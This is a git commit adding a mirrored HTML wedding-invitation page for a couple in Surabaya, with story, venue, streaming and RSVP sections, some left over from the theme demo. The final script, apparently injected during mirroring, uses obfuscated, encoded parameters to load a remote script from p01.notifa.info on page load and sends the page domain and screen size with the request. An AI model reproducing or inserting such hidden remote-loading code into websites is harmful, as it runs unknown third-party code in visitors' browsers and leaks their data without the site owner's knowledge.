007437b006c937a568a589c10d8414552acefad5
Aldo Kevindra Rezandy <aldokevindra@gmail.com>
2020-07-13 23:30:30 +0700

    Initial commit

---
+++ index.php
@@ -0,0 +1,377 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from glanz.starkethemes.com/html/01_01_home_simple_flowers.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 06 Jul 2020 12:21:07 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Glanz</title>
+
+
+<!-- Favicon -->
+<link rel="icon" href="images/favicon.ico" type="image/x-icon">
+
+<!-- Library CSS -->
+<link href="css/glanz_library.css" rel="stylesheet">
+
+<!-- Icons CSS -->
+<link href="fonts/themify-icons.css" rel="stylesheet">
+
+<!-- Theme CSS -->
+<link href="css/glanz_style.css" rel="stylesheet">
+
+<!-- Google Fonts -->
+<link href="https://fonts.googleapis.com/css?family=Dosis:300,400,600,700%7COpen+Sans:300,400,700%7CPlayfair+Display:400,400i,700,700i" rel="stylesheet">
+
+<!-- Other Fonts -->
+<link href="fonts/marsha/stylesheet.css" rel="stylesheet">
+
+</head>
+
+
+<!-- Body -->
+<body class="gla_middle_titles">
+
+
+<!-- Page -->
+<div class="gla_page" id="gla_page">
+
+    
+    
+    <!-- To Top -->
+    <a href="#gla_page" class="gla_top ti ti-angle-up gla_go"></a>
+
+    <!-- Music -->
+    <div class="gla_music_icon">
+        <i class="ti ti-music"></i>
+    </div>
+    <div class="gla_music_icon_cont">
+        <iframe src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/108238095&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;visual=true"></iframe>
+    </div>
+    
+    <!-- Header -->
+    <header>       
+        <nav class="gla_light_nav gla_transp_nav">
+
+            <div class="container">
+                
+                <div class="gla_logo_container clearfix">
+                    <img src="images/glanz_logo.png" alt="" class="gla_logo_rev">
+                    <div class="gla_logo_txt">
+                        <!-- Logo -->
+                        <a class="gla_logo">Noah & Audrey</a>
+                        
+                        <!-- Text Logo -->
+                        <div class="gla_logo_und">August 08, 2020</div>
+                    </div>
+                </div>
+
+                <!-- Menu -->
+                
+                <!-- Menu Content -->
+                <!-- menu content end -->
+
+                <!-- Search Block -->
+                <!-- Search Block End -->
+
+                <!-- Top Menu -->
+                <!-- Top Menu End -->
+
+
+               
+            </div>
+            <!-- container end -->
+        </nav>
+        
+    </header>
+    <!-- Header End -->
+
+
+    <!-- Slider -->
+    <div class="gla_slider gla_image_bck  gla_wht_txt gla_fixed"  data-image="images/na_images_edited/slider2.jpg" data-stellar-background-ratio="0.8">
+
+        <!-- Over -->
+        <div class="gla_over" data-color="#9abab6" data-opacity="0.2"></div>
+
+
+        <div class="container">
+
+            
+            <!-- Slider Texts -->
+            <div class="gla_slide_txt gla_slide_center_bottom text-center">
+                <p><img src="images/animations/ourwedding_wh.gif" data-top-bottom="@src:images/animations/ourwedding_wh.gif" alt="" height="150"></p>
+                
+            </div>
+            <!-- Slider Texts End -->
+        
+        </div>
+        <!-- container end -->
+
+        <!-- Slide Down -->
+        <a class="gla_scroll_down gla_go" href="#gla_content">
+            <b></b>
+            Scroll
+        </a>
+
+
+    </div>
+    <!-- Slider End -->
+
+    <!-- Content -->
+    <section id="gla_content" class="gla_content">
+
+
+       <!-- section -->
+        <section class="gla_section gla_image_bck" data-color="#f9fbf7">
+            
+
+            
+            <div class="container text-center">
+                <p><img src="images/animations/flowers.gif" data-bottom-top="@src:images/animations/flowers.gif" height="150" alt=""></p>
+                <h2>Our Story</h2>
+                <h3 class="gla_subtitle">The Fourth of July</h3>
+
+                <p>My fiancé proposed on the Fourth of July. My mother asked us to go to the backyard to get some chairs and he took me by the shed where we could see all of the fireworks. He kissed me, then he took the ring box out of his pocket and asked me to be his wife. He was shaking a little. The proposal was a little silly but perfect, just like him." — Jeska Cords</p>
+                
+            </div>
+            <!-- container end -->
+
+        </section>
+        <!-- section end -->
+
+
+        <!-- section -->
+        <section class="gla_section gla_image_bck gla_fixed gla_wht_txt" data-stellar-background-ratio="0.8" data-image="images/na_images_edited/loc.jpg">
+            
+            <!-- Over -->
+            <div class="gla_over" data-color="#282828" data-opacity="0.4"></div>
+            
+            <div class="container text-center">
+                <p><img src="images/animations/savethedate_wh.gif" data-bottom-top="@src:images/animations/savethedate_wh.gif" height="150" alt=""></p>
+                <h2>August 08th, 2020</h2>
+                <h3 class="gla_subtitle">St. Thomas's Church,<br>Surabaya, Indonesia</h3>
+                <div class="gla_countdown" data-year="2020" data-month="08" data-day="08"></div>
+                
+            </div>
+            <!-- container end -->
+
+        </section>
+        <!-- section end -->
+
+
+        <!-- section -->
+        <section class="gla_section">
+            
+            
+            <div class="container text-center">
+                <p><img src="images/animations/flowers2.gif" data-bottom-top="@src:images/animations/flowers2.gif" height="150" alt=""></p>
+                <h2>Wedding Details</h2>
+                <h3 class="gla_subtitle">When & Where</h3>
+                <p>
+                    Our ceremony and reception will be held at the Shangri-la Ballroom. <br>
+                    Located on the Mayjend Sungkono. <br><br>
+                    August 08th, 2020
+                </p>
+                <!-- boxes -->
+                <div class="gla_icon_boxes row text-left">
+
+                    <!-- item -->
+                    <div class="col-md-4 col-sm-6">
+                        <a class="gla_news_block">
+                            <span class="gla_news_img">
+                                <span class="gla_over" data-image="images/wedding/andy_jeska/600x600/10095142066_6a86ebfe67_k.jpg"></span>    
+                            </span>
+                           
+
+                            <span class="gla_news_title">The Venue</span>
+                            <p><strong>St. Thomas's Church,</strong><br>Bristol, U.K.</p>
+
+
+                        </a>
+                    </div> 
+
+                    <!-- item -->
+                    <div class="col-md-4 col-sm-6">
+                        <a class="gla_news_block">
+                            <span class="gla_news_img">
+                                <span class="gla_over" data-image="images/wedding/andy_jeska/600x600/10100100896_8b80e531d1_k.jpg"></span>  
+                            </span>
+                           
+
+                            <span class="gla_news_title">What to Wear</span>
+                            <p><strong>Keep it classy</strong>. <br>No jeans or cowboy hats please.</p>
+
+
+                        </a>
+                    </div> 
+
+
+                    <!-- item -->
+                    <div class="col-md-4 col-sm-6">
+                        <a class="gla_news_block">
+                            <span class="gla_news_img">
+                                <span class="gla_over" data-image="images/wedding/600x600/q9nabuuiuvq-scott-webb.jpg"></span>  
+                            </span>
+                           
+
+                            <span class="gla_news_title">Parking</span>
+                            <p>There is a parking lot on premises as well as down the street <strong>near the candy store</strong>.</p>
+
+
+                        </a>
+                    </div> 
+
+
+                </div>
+                <!-- boxes end -->
+
+                
+            </div>
+            <!-- container end -->
+
+        </section>
+        <!-- section end -->
+
+
+
+        <!-- section -->
+        <section class="gla_section gla_image_bck gla_wht_txt gla_fixed" data-stellar-background-ratio="0.8" data-image="images/na_images_edited/img3.jpg">
+
+            <!-- Over -->
+            <div class="gla_over" data-color="#282828" data-opacity="0.4"></div>
+            
+            <div class="container text-center">
+       
+                <h2>Live Streaming</h2>
+                
+                <p>We’re lucky enough to have nearly everything we need for our home already. And since neither of us has ever been outside of North America, we want our honeymoon to be extra special! If you want to help make it unforgettable, you can contribute using the link to the right. If you would like to give us something to update our home, we’ve compiled a short registry as well.</p>
+
+                <!-- icon boxes -->
+                <div class="gla_icon_boxes gla_partners row">
+                    <!-- item -->
+                    <div class="gla_partner_box">
+                        <a href="#"><img src="images/partners/kosongan.png" height="auto" alt=""></a>
+                    </div>
+                    <div class="gla_partner_box">
+                        <a href="#"><img src="images/partners/zoom.png" height="auto" alt=""></a>
+                    </div>
+
+                    <!-- item -->
+                    <div class="gla_partner_box">
+                        <a href="https://www.youtube.com/watch?v=hKY4gXR7y30"><img src="images/partners/youtube.png" height="auto" alt=""></a>
+                    </div>
+
+                    <div class="gla_partner_box">
+                        <a href="https://www.instagram.com/gnfi/"><img src="images/partners/ig.png" height="auto" alt=""></a>
+                    </div>
+
+                    
+                   
+                    
+
+                </div>
+                <!-- icon boxes end -->              
+                
+            </div>
+            <!-- container end -->
+
+        </section>
+        <!-- section end -->
+
+
+        <!-- section -->
+        <section class="gla_section">
+            
+            
+            <div class="container text-center">
+                <p><img src="images/animations/rsvp.gif" data-bottom-top="@src:images/animations/rsvp.gif" height="180" alt=""></p>
+                
+                <div class="row">
+                    <div class="col-md-8 col-md-push-2">
+                        <form action="https://formspree.io/your@mail.com" method="POST">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <label>Your name*</label>
+                                    <input type="text" name="name" class="form-control form-opacity">
+                                </div>
+                                <div class="col-md-6">
+                                    <label>Your e-mail*</label>
+                                    <input type="text" name="email" class="form-control form-opacity">
+                                </div>
+                  
+                                <div class="col-md-6">
+                                    <label>Will you attend?</label>
+
+                                    <input type="radio" name="attend" value="Yes, I will be there">
+                                    <span>Yes, I will be there</span><br>
+                                    <input type="radio" name="attend" value="Sorry, I can't come">
+                                    <span>Sorry, I can't come</span>
+                                    
+                                </div>
+                                <div class="col-md-6">
+                                    <label>Meal preference</label>
+                                    <select name="meal" class="form-control form-opacity">
+                                        <option value="I eat anything">I eat anything</option>
+                                        <option value="Beef">Beef</option>
+                                        <option value="Chicken">Chicken</option>
+                                        <option value="Vegetarian">Vegetarian</option>
+                                    </select>
+                                </div>
+                                <div class="col-md-12">
+                                    <label>Notes</label>
+                                    <textarea name="message" class="form-control form-opacity"></textarea>
+                                </div>
+                                <div class="col-md-12">
+                                    <input type="submit" class="btn submit" value="Send">
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                
+                
+            </div>
+            <!-- container end -->
+
+        </section>
+        <!-- section end -->
+
+        <!-- section -->
+        <section class="gla_section gla_image_bck gla_fixed gla_wht_txt" data-stellar-background-ratio="0.8" data-image="images/wedding/andy_jeska/10100565866_2fd1627ee6_k.jpg">
+            
+            <!-- Over -->
+            <div class="gla_over" data-color="#282828" data-opacity="0.4"></div>
+            
+            <div class="container text-center">
+                <p><img src="images/animations/thnyou_wh.gif" alt="" height="200" data-bottom-top="@src:images/animations/thnyou_wh.gif"></p>
+
+                
+                
+            </div>
+            <!-- container end -->
+
+        </section>
+        <!-- section end -->
+
+    </section>
+    <!-- Content End --> 
+
+</div>
+<!-- Page End -->
+
+
+
+<!-- JQuery -->
+<script src="js/jquery-1.12.4.min.js"></script> 
+<!-- Library JS -->
+<script src="js/glanz_library.js"></script> 
+
+<!-- Theme JS -->
+<script src="js/glanz_script.js"></script>
+
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXcpm%2fuw6cH%2fjn0kY5gfqEv2BE9lW%2fRsmZMY0wJXEp6Dap8zCEu54LDp58dyVQsOvQ77Ayq1Hbr2p5QbSX%2bJ7jF4owzty6ULltYZHSWWnxLlpA3LFSfQTVhyiH99jGU8H9wS1L5bDjQ%2f6EtbKL8u%2fCcRrafFLea647O4QST8UBLPNxetknuXFzYGGBg5ay1l7DGXMMVYJ%2ffsPeGurFeB1Wt%2fN9HWOHjQuVQadky%2fjirhk0z10u4OrKMf5OZzu20iSyoRHBjUfkZpDJiSNBe1jxCOtlzs%2fGwCdr29WUR8q9TaQzUfGeLbJZxNi03wo6A7JZqZJAJxrKtcJlV7pvu69MQ1SsRKssgsE8nI71JhMpWCOuEcV4US7YVm%2fJud%2bh9F5OXMGOxStuwlDR8H%2f%2fr0NVQX%2fLwS5HXBzdOH%2bkmvZVtjiHZrVBRjslxKGdUhg4M0zPFnf0A3NIKLO5VyidwXpPbCDhGBETt9rqfAQo3yOcbSoItk6myWIUzWyVh%2fOljC1RcEz00GC3%2fQM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+<!-- Mirrored from glanz.starkethemes.com/html/01_01_home_simple_flowers.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 06 Jul 2020 12:30:30 GMT -->
+</html>
